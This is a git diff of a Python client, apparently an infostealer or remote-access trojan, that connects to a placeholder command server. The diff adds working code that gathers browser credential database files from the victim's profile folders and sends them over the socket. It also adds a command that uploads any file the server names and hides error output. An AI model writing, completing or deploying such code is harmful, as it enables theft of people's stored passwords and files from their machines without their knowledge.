@@ -7,7 +7,7 @@ import multiprocessing
 import time
 import sys
 
-control_address = ("localhost", 8080)
+control_address = ("server address", "SERVER_PORT")
 
 local = os.getenv("LOCALAPPDATA")
 roaming = os.getenv("APPDATA")
@@ -78,7 +78,7 @@ def Start_Client():
 
         command = sock.recv(4096).decode("utf-8")
         if command.__contains__(CID):
-            if command.__contains__("Creds"):
+            if command.__contains__("creds"):
                 if command.__contains__("full"):
                     mode = 1
                 else:
@@ -86,17 +86,22 @@ def Start_Client():
 
                 t = GetBrowserCreds()
 
+                mode = 0
+
                 sock.sendall(f"found {len(t)} files\nDownload(Y/n)".encode())
                 time.sleep(2)
                 confirmation = sock.recv(1024).decode("utf-8")
                 if confirmation.upper() == "N":
                     sock.send("not downloading".encode())
                 elif confirmation.upper() == "Y":
-                    # read bytes from file and send
-                    # requires the upload file function, coming soon (when I can be bothered)
-                    pass
+                    sock.send("uploading files...".encode())
+                    time.sleep(1)
+                    UploadFile(t, sock)
                 else:
                     sock.send("Invaild operation...".encode())
+            if command.__contains__("download"):
+                filepath = command.split(" ")[3]
+                UploadFile(filepath, sock)
 
         # sock.sendall(cred)
         # print(cred)
@@ -104,7 +109,6 @@ def Start_Client():
 
 def CheckOS():
     os_type = platform.system()
-    # subprocess.run("uname", capture_output=False)
     return os_type
 
 
@@ -124,21 +128,18 @@ def GetBrowserCreds():
                 .stdout.decode("utf-8")
                 .split("\n")[0]
             )
-            # print(os.path.join(path, directory))
+
             for root, dirs, files in os.walk(os.path.join(path, directory)):
                 for file in files:
                     if mode == 1:
                         for extension in extensions_full:
                             if file.endswith(extension):
                                 dbfiles.append(os.path.join(root, file))
-                                # r = open(os.path.join(root, file), "rb")
-                                # print(r)
+
                     else:
                         for extension in extensions_db:
                             if file.endswith(extension):
                                 dbfiles.append(os.path.join(root, file))
-                                # r = open(os.path.join(root, file), "rb")
-                                # print(r)
 
     elif os_type == "Darwin":
         pass
@@ -153,26 +154,39 @@ def GetBrowserCreds():
                 .stdout.decode("utf-8")
                 .split("\n")[0]
             )
-            # print(os.path.join(path, directory))
+
             for root, dirs, files in os.walk(os.path.join(path, directory)):
                 for file in files:
                     if mode == 1:
                         for extension in extensions_full:
                             if file.endswith(extension):
                                 dbfiles.append(os.path.join(root, file))
-                                # r = open(os.path.join(root, file), "rb")
-                                # print(r)
+
                     else:
                         for extension in extensions_db:
                             if file.endswith(extension):
                                 dbfiles.append(os.path.join(root, file))
-                                # r = open(os.path.join(root, file), "rb")
-                                # print(r)
+
     return dbfiles
 
 
-def UploadFile():
-    pass
+def UploadFile(files, sock):
+    if isinstance(files, list):
+        for file in files:
+            try:
+                sock.send(f"file: {file}".encode("utf-8"))
+                with open(file, "rb") as upload:
+                    sock.send(upload.read())
+                time.sleep(5)
+            except Exception as E:
+                sock.send(str(E).encode())
+    else:
+        try:
+            sock.send(files.encode())
+            with open(files, "rb") as upload:
+                sock.send(upload.read())
+        except Exception as E:
+            sock.send(str(E).encode())
 
 
 def DownloadFile():
@@ -191,6 +205,6 @@ if __name__ == "__main__":
     try:
         Start_Client()
     except Exception as E:
-        print(E)
+        # print(E)
         # sock.send(str(E).encode())
         sys.exit(1)
